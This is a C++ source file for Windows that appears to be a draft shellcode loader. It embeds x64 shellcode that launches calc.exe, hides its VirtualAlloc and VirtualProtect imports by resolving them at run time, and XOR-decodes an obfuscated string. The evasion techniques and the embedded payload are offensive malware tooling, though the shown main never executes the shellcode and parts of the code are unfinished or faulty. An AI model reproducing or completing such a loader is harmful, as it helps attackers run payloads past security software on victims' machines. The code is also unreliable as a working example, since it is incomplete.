#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#define FAVICON_ICO 
#include <iostream>

//ico for shellcode

unsigned char shellcode[] = { 
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
  0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
  0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
  0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
  0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
  0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
  0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
  0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
  0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
  0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
  0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
  0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
  0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
  0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
  0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
  0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
  0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
  0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00 
};

char XORKey[] = "CnfJuIafDPxDnFtDShjVKDpaqmfsrdRkuoIGfZFhIqUjLomBlNBgNGfvpIuth";
size_t XORKey_length = sizeof(XORKey);


size_t shellcode_length = sizeof(shellcode);

//1) XOR Decrypt
//void XORdecrypt(unsigned char& shellcode, size_t shellcode_length, char& XORKey, size_t XORKey_length)
void XORDecryptLPC(unsigned char encoded[], int sizeOfEncodedStr, char XORKey[], size_t XORKey_length)
{

	for (int it = 0; it < sizeOfEncodedStr; it++)
	{
		encoded[it] = (unsigned char)((encoded[it]) ^ XORKey[(it % XORKey_length)]);
		printf("character %d: %c \n",it, encoded[it]);

	}


}

//3) Base64 Decrypt

typedef LPVOID (WINAPI* functVirtualAlloc)(//function pointer
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD flAllocationType,
	DWORD flProtect);


typedef BOOL(WINAPI* functVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
//This variable with store the address of virtual protect.



int main()
{
	bool isAllocated;
	//LPVOID pVirtualAlloc;
	void* memoryBuffer;
	functVirtualProtect pVirtualProtect;
	functVirtualAlloc pVirtualAlloc;

	pVirtualAlloc = (functVirtualAlloc)GetProcAddress(GetModuleHandle("Kernel32.dll"), "VirtualAlloc"); //point our function pointer to starting code of VirtualAlloc
	pVirtualProtect = (functVirtualProtect)GetProcAddress(GetModuleHandle("Kernel32.dll"), "VirtualProtect"); //Why are DLL names LPCSTR, and not LPWSTR>?>?>?>?>>??>
	//VirtualAlloc buffer that is sizeof shellcode
	//(*pVirtualAllocFunction)
	memoryBuffer = pVirtualAlloc(0, 40096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("pointer to mem: %p", memoryBuffer);

	unsigned char kernel[] = { 0x8, 0xb, 0x14, 0x24, 0x10, 0x25, 0x5, 0xa, 0x28 };


	XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length);

	while (4 > 2)
	{

	}
	return -1;
}